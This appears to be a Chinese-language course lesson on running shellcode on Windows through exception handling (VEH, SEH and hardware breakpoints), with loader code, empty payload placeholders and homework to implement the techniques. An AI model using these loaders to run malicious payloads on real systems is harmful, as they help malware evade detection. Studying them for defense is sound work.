# 课时38：补充异常ShellCode加载方式

## 1. 课程目标

学习使用异常处理机制来执行ShellCode。

---

## 2. 异常处理基础

Windows异常处理类型：
- SEH (Structured Exception Handling) - 结构化异常处理
- VEH (Vectored Exception Handling) - 向量化异常处理

---

## 3. VEH加载ShellCode

```cpp
#include <windows.h>

unsigned char shellcode[] = { /* ShellCode */ };
LPVOID pShellcode = NULL;

LONG CALLBACK VEHHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        // 修改RIP/EIP指向ShellCode
#ifdef _WIN64
        pExInfo->ContextRecord->Rip = (DWORD64)pShellcode;
#else
        pExInfo->ContextRecord->Eip = (DWORD)pShellcode;
#endif
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main() {
    // 准备ShellCode
    pShellcode = VirtualAlloc(NULL, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    memcpy(pShellcode, shellcode, sizeof(shellcode));
    
    // 注册VEH
    AddVectoredExceptionHandler(1, VEHHandler);
    
    // 触发异常
    int* pNull = NULL;
    *pNull = 1;  // 访问违规 → VEH处理 → 跳转到ShellCode
    
    return 0;
}
```

---

## 4. SEH加载ShellCode

```cpp
#include <windows.h>

unsigned char shellcode[] = { /* ShellCode */ };

void ExecuteViaSEH() {
    LPVOID pShellcode = VirtualAlloc(NULL, sizeof(shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    memcpy(pShellcode, shellcode, sizeof(shellcode));
    
    __try {
        int* p = NULL;
        *p = 1;  // 触发异常
    }
    __except(
        // 异常过滤器中执行ShellCode
        ((void(*)())pShellcode)(),
        EXCEPTION_EXECUTE_HANDLER
    ) {
        // 这里不会执行
    }
}
```

---

## 5. 硬件断点触发

```cpp
#include <windows.h>

LPVOID pShellcode = NULL;

LONG CALLBACK HWBPHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // 清除DR7
        pExInfo->ContextRecord->Dr7 = 0;
        
        // 跳转到ShellCode
#ifdef _WIN64
        pExInfo->ContextRecord->Rip = (DWORD64)pShellcode;
#else
        pExInfo->ContextRecord->Eip = (DWORD)pShellcode;
#endif
        
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void ExecuteViaHWBP() {
    // 准备ShellCode
    pShellcode = VirtualAlloc(NULL, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    memcpy(pShellcode, shellcode, sizeof(shellcode));
    
    // 注册VEH
    AddVectoredExceptionHandler(1, HWBPHandler);
    
    // 设置硬件断点
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    
    ctx.Dr0 = (DWORD_PTR)&main;  // 断点地址
    ctx.Dr7 = 1;  // 启用DR0
    
    SetThreadContext(GetCurrentThread(), &ctx);
}
```

---

## 6. 课后作业

### 作业1：VEH加载（必做）

1. 实现VEH方式加载ShellCode
2. 测试执行效果

### 作业2：硬件断点（进阶）

1. 使用硬件断点触发ShellCode执行
2. 研究检测方法

---

## 7. 下一课预告

下一课我们将补充更多异常ShellCode加载和反调试方法。
